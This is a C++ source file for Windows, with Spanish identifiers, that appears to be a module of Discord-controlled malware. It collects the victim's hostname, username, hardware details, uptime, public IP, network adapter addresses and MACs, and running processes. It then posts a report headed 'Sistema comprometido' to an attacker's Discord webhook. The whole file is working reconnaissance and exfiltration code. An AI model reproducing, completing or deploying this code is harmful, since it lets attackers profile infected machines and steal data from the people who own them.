#include "systeminfo.h"
#include "discord.h"
#include "config.h"

#include <windows.h>
#include <winhttp.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <sstream>
#include <vector>
#include <psapi.h>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "winhttp.lib")

std::vector<InfoRed> ObtenerInfoRed() {
    std::vector<InfoRed> resultado;
    ULONG bufferSize = 15000;
    PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)malloc(bufferSize);
    ULONG ret = GetAdaptersInfo(pAdapterInfo, &bufferSize);

    if (ret == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(bufferSize);
        ret = GetAdaptersInfo(pAdapterInfo, &bufferSize);
    }

    if (ret == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        while (pAdapter) {
            InfoRed info;
            info.nombre  = Utf8ToWide(pAdapter->Description);
            info.tipo    = Utf8ToWide(std::to_string(pAdapter->Type));
            info.ip      = Utf8ToWide(pAdapter->IpAddressList.IpAddress.String);
            info.mascara = Utf8ToWide(pAdapter->IpAddressList.IpMask.String);

            std::wstringstream mac;
            for (UINT i = 0; i < pAdapter->AddressLength; i++) {
                if (i > 0) mac << L":";
                wchar_t buf[4];
                swprintf_s(buf, L"%02X", pAdapter->Address[i]);
                mac << buf;
            }
            info.mac = mac.str();
            resultado.push_back(info);
            pAdapter = pAdapter->Next;
        }
    }
    free(pAdapterInfo);
    return resultado;
}

std::wstring ObtenerIPPublica() {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return L"?";
    HINTERNET hConnect = WinHttpConnect(hSession, L"api.ipify.org",
        INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return L"?"; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/",
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return L"?";
    }
    std::string respuesta;
    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        WinHttpReceiveResponse(hRequest, NULL)) {
        DWORD bytesLeidos = 0;
        char buffer[1024];
        while (WinHttpReadData(hRequest, buffer, sizeof(buffer) - 1, &bytesLeidos)
               && bytesLeidos > 0) {
            buffer[bytesLeidos] = 0;
            respuesta += buffer;
        }
    }
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return respuesta.empty() ? L"?" : Utf8ToWide(respuesta);
}

std::wstring ObtenerRAM() {
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    DWORDLONG totalMB = memInfo.ullTotalPhys / (1024 * 1024);
    return std::to_wstring(totalMB) + L" MB";
}

std::wstring ObtenerArquitectura() {
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    switch (si.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64: return L"x64 (64-bit)";
        case PROCESSOR_ARCHITECTURE_INTEL: return L"x86 (32-bit)";
        case PROCESSOR_ARCHITECTURE_ARM64: return L"ARM64";
        default: return L"Desconocida";
    }
}

std::vector<std::wstring> ObtenerProcesosActivos(int maximo) {
    std::vector<std::wstring> procesos;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return procesos;
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (procesos.size() >= (size_t)maximo) break;
            procesos.push_back(pe.szExeFile);
        } while (Process32NextW(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return procesos;
}

std::wstring ObtenerUptime() {
    DWORD uptime = GetTickCount() / 1000;
    DWORD horas = uptime / 3600;
    DWORD minutos = (uptime % 3600) / 60;
    std::wstringstream ss;
    ss << horas << L"h " << minutos << L"min";
    return ss.str();
}

void EnviarInfoSistemaCompleta() {
    wchar_t hostname[256]; DWORD size = 256;
    GetComputerNameW(hostname, &size);
    wchar_t usuario[256]; size = 256;
    GetUserNameW(usuario, &size);

    std::wstringstream ss;
    ss << L"🖥️ **Sistema comprometido**\n"
       << L"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
       << L"**Hostname:**     `" << hostname << L"`\n"
       << L"**Usuario:**      `" << usuario << L"`\n"
       << L"**Arquitectura:** `" << ObtenerArquitectura() << L"`\n"
       << L"**RAM:**          `" << ObtenerRAM() << L"`\n"
       << L"**Uptime:**       `" << ObtenerUptime() << L"`\n"
       << L"**IP pública:**   `" << ObtenerIPPublica() << L"`\n"
       << L"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";

    DiscordEnviarTexto(WEBHOOK_SISTEMA, ss.str());

    std::wstringstream ss2;
    ss2 << L"🌐 **ADAPTADORES DE RED**\n"
        << L"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";

    auto adaptadores = ObtenerInfoRed();
    for (size_t i = 0; i < adaptadores.size() && i < 5; i++) {
        auto& a = adaptadores[i];
        ss2 << L"\n**[" << (i + 1) << L"] " << a.nombre << L"**\n"
            << L"  • IP:      `" << a.ip << L"`\n"
            << L"  • Máscara: `" << a.mascara << L"`\n"
            << L"  • MAC:     `" << a.mac << L"`\n";
    }

    DiscordEnviarTexto(WEBHOOK_SISTEMA, ss2.str());
}